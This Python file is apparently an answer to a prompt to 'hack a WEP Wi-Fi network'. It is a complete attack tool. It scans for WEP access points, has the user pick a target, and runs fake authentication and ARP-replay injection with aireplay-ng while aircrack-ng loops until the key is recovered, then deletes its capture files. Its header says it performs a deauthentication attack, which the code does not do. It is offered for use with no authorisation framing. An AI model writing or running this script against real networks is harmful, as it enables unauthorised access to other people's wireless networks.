# Write a Python script to Hack a WEP Wi-Fi Network
# This script captures packets from a WEP-encrypted Wi-Fi network and performs a deauthentication attack to force clients to reconnect, allowing the capture of the necessary packets for cracking WEP encryption.

import os
import subprocess
import re
from threading import Thread
import sys
# from datetime import datetime
import time

# helper functions
def find_wep_networks(interface):
    """Scans for WEP networks and returns them as a list."""
    print("[*] Scanning for WEP networks... Press Ctrl+C to stop scanning.")
    wep_networks = []
    try:
        # starts a process to scan the area for networks.
        proc = subprocess.Popen(
            ['sudo', 'airodump-ng', interface],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        time.sleep(10) # scan for 10 seconds
    except KeyboardInterrupt:
        pass
    finally:
        proc.terminate()
        proc.wait()
        output = proc.communicate()[0]

    # uses a pattern to find wep networks in the scan results.
    network_regex = re.compile(r'(?P<bssid>([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2})\s+.*?\s+(?P<channel>\d{1,2})\s+.*?\s+WEP\s+WEP\s+.*?\s+(?P<essid>.*)')
    
    for line in output.split('\n'):
        match = network_regex.search(line)
        if match:
            network_info = match.groupdict()
            # cleans up the network name.
            network_info['essid'] = network_info['essid'].strip()
            if network_info['essid'] and 'length' not in network_info['essid']:
                wep_networks.append(network_info)
    
    return wep_networks

def select_target(networks):
    """Displays a list of networks and prompts the user to select one."""
    if not networks:
        print("[!] No WEP networks found. Exiting.")
        return None

    print("\n[+] Found WEP Networks:")
    for i, net in enumerate(networks):
        print(f"  [{i}] BSSID: {net['bssid']} | Channel: {net['channel']:<2} | ESSID: {net['essid']}")

    # gets the user's choice.
    while True:
        try:
            choice = int(input("\n[*] Select your target network number: "))
            if 0 <= choice < len(networks):
                return networks[choice]
            else:
                print("[!] Invalid selection.")
        except ValueError:
            print("[!] Please enter a number.")

def set_monitor_mode(interface):
    """Ensures the specified interface is in monitor mode."""
    print(f"[*] Setting interface {interface} to monitor mode...")
    try:
        # runs a series of commands to prepare the wireless card.
        subprocess.run(['sudo', 'ifconfig', interface, 'down'], check=True)
        subprocess.run(['sudo', 'iwconfig', interface, 'mode', 'monitor'], check=True)
        subprocess.run(['sudo', 'ifconfig', interface, 'up'], check=True)
        print(f"[+] Interface {interface} is now in monitor mode.")
        return True
    except subprocess.CalledProcessError:
        print(f"[!] Failed to set {interface} to monitor mode. Make sure the interface name is correct.")
        return False

# --- attack functions ---
def run_airodump(interface, bssid, channel, filename):
    """Starts airodump-ng to capture packets for a specific target."""
    print("[*] Starting packet capture...")
    command = ['sudo', 'airodump-ng', '--bssid', bssid, '-c', channel, '-w', filename, interface]
    subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def run_fake_auth(interface, bssid):
    """Performs fake authentication to associate with the target AP."""
    print("[*] Performing fake authentication...")
    command = ['sudo', 'aireplay-ng', '--fakeauth', '0', '-a', bssid, interface]
    subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(5)

def run_arp_replay(interface, bssid):
    """Starts the ARP request replay attack to generate IVs."""
    print("[*] Starting ARP request replay attack to generate traffic...")
    command = ['sudo', 'aireplay-ng', '--arpreplay', '-b', bssid, interface]
    subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def run_aircrack(filename):
    """Runs aircrack-ng in a loop to crack the key."""
    print("\n[***] Starting cracking process. This will run until the key is found. [***]")
    key_found = False
    while not key_found:
        try:
            # checks the captured file for the key.
            result = subprocess.run(
                ['sudo', 'aircrack-ng', f'{filename}-01.cap'],
                capture_output=True,
                text=True,
                check=True
            )
            if "KEY FOUND!" in result.stdout:
                print("\n" + "="*40)
                print("[!!!] WEP KEY FOUND! [!!!]")
                print(result.stdout)
                print("="*40)
                key_found = True
            else:
                # provides a status update to the user.
                print("[*] Not enough packets yet, still trying...", end='\r')
                time.sleep(10)
        except subprocess.CalledProcessError as e:
            # aircrack-ng gives an error if the key isn't found, so we just continue.
            time.sleep(10)
        except KeyboardInterrupt:
            print("\n[*] Exiting cracker.")
            break

# --- main function ---
def main():
    # checks if the user provided a wireless interface.
    if len(sys.argv) < 2:
        print(f"Usage: sudo python3 {sys.argv[0]} <wireless_interface>")
        sys.exit(1)
    
    interface = sys.argv[1]
    
    if not set_monitor_mode(interface):
        sys.exit(1)

    networks = find_wep_networks(interface)
    target = select_target(networks)
    
    if not target:
        sys.exit(1)
        
    bssid = target['bssid']
    channel = target['channel']
    essid = target['essid']
    filename = "wep_capture"

    print(f"\n[+] Target locked: {essid} ({bssid}) on channel {channel}")
    
    # cleans up any old files from previous attempts.
    for ext in ['.cap', '.csv', '.kismet.csv', '.kismet.netxml', '.log.csv']:
        if os.path.exists(f"{filename}-01{ext}"):
            os.remove(f"{filename}-01{ext}")
    
    # starts all the different attack tools at the same time.
    dumper = Thread(target=run_airodump, args=(interface, bssid, channel, filename))
    auth = Thread(target=run_fake_auth, args=(interface, bssid))
    arp = Thread(target=run_arp_replay, args=(interface, bssid))
    cracker = Thread(target=run_aircrack, args=(filename,))
    
    try:
        dumper.start()
        time.sleep(5) # gives the packet capture a head start.
        auth.start()
        time.sleep(5) # waits for the fake connection to be made.
        arp.start()
        cracker.start()
        
        # waits for the cracking process to finish.
        cracker.join()

    except KeyboardInterrupt:
        print("\n[*] Shutting down all processes...")
    finally:
        # stops all the running attack tools.
        subprocess.run(['sudo', 'killall', 'airodump-ng', 'aireplay-ng', 'aircrack-ng'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("[+] All attack processes have been terminated.")
        
        # performs a final cleanup of capture files.
        for ext in ['.cap', '.csv', 'kismet.csv', '.kismet.netxml', '.log.csv']:
             if os.path.exists(f"{filename}-01{ext}"):
                os.remove(f"{filename}-01{ext}")
        print("[+] Capture files cleaned up.")

# this line makes sure the main function runs when the script starts.
if __name__ == "__main__":
    main()